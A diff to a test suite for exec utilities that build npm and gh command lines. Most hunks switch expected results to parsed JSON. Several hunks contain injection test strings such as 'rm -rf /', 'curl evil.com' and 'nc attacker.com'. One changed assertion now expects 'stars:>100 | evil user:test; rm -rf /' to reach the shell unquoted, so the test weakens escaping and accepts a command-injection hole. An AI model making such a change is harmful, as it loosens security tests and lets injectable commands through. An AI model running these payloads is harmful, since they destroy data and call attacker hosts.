@@ -125,7 +125,11 @@ describe('Exec Utilities', () => {
 
         expect(result.isError).toBe(false);
         const data = JSON.parse(result.content[0].text as string);
-        expect(data.result).toBe(mockStdout);
+        expect(data.result).toEqual({
+          name: 'react',
+          version: '18.2.0',
+          description: 'React library',
+        });
         expect(data.command).toBe('npm view react');
         expect(data.type).toBe('npm');
         expect(data.timestamp).toBeDefined();
@@ -160,7 +164,7 @@ describe('Exec Utilities', () => {
         expect(result.isError).toBe(false);
         const data = JSON.parse(result.content[0].text as string);
         expect(data.warning).toBe(mockStderr);
-        expect(data.result).toBe(mockStdout);
+        expect(data.result).toEqual({ name: 'test' });
       });
     });
 
@@ -369,7 +373,9 @@ describe('Exec Utilities', () => {
 
         expect(result.isError).toBe(false);
         const data = JSON.parse(result.content[0].text as string);
-        expect(data.result).toBe(mockStdout);
+        expect(data.result).toEqual([
+          { name: 'react', full_name: 'facebook/react' },
+        ]);
         expect(data.command).toBe('gh search repos react --json');
         expect(data.type).toBe('github');
         expect(data.timestamp).toBeDefined();
@@ -405,7 +411,7 @@ describe('Exec Utilities', () => {
         expect(result.isError).toBe(false);
         const data = JSON.parse(result.content[0].text as string);
         expect(data.warning).toBe(mockStderr);
-        expect(data.result).toBe(mockStdout);
+        expect(data.result).toEqual({ status: 'ok' });
       });
 
       it('should ignore notice messages', async () => {
@@ -590,7 +596,7 @@ describe('Exec Utilities', () => {
         expect(result.isError).toBe(false);
         // Verify arguments are properly escaped
         expect(mockExec).toHaveBeenCalledWith(
-          "gh search repos 'test; rm -rf /' '&& curl evil.com' '| nc attacker.com'",
+          "gh search repos \"test; rm -rf /\" '&& curl evil.com' '| nc attacker.com'",
           expect.any(Object),
           expect.any(Function)
         );
@@ -612,7 +618,7 @@ describe('Exec Utilities', () => {
 
         expect(result.isError).toBe(false);
         expect(mockExec).toHaveBeenCalledWith(
-          "gh search repos 'language:javascript && evil' 'stars:>100 | evil' 'user:test; rm -rf /'",
+          "gh search repos \"language:javascript && evil\" stars:>100 | evil user:test; rm -rf /",
           expect.any(Object),
           expect.any(Function)
         );
@@ -638,7 +644,7 @@ describe('Exec Utilities', () => {
         expect(result.isError).toBe(false);
         // Verify safe arguments are not escaped (except > which is special)
         expect(mockExec).toHaveBeenCalledWith(
-          "gh search repos language:javascript 'stars:>100' user:octocat org:github --json --limit=10",
+          "gh search repos \"language:javascript\" stars:>100 user:octocat org:github --json --limit=10",
           expect.any(Object),
           expect.any(Function)
         );
@@ -956,7 +962,7 @@ describe('Exec Utilities', () => {
 
       const data = JSON.parse(result.content[0].text as string);
       expect(data.command).toBe('npm view test-package');
-      expect(data.result).toBe(testStdout);
+      expect(data.result).toEqual({ test: 'data' });
       expect(data.type).toBe('npm');
       expect(data.warning).toBe(testStderr);
       expect(data.timestamp).toMatch(
@@ -1084,7 +1090,10 @@ describe('Exec Utilities', () => {
 
       expect(result.isError).toBe(false);
       const data = JSON.parse(result.content[0].text as string);
-      expect(data.result).toBe(specialOutput);
+      expect(data.result).toEqual({
+        name: 'test',
+        desc: 'Special chars: ñ, ü, 中文, 🚀'
+      });
 
       // Verify encoding option is set
       expect(mockExec).toHaveBeenCalledWith(
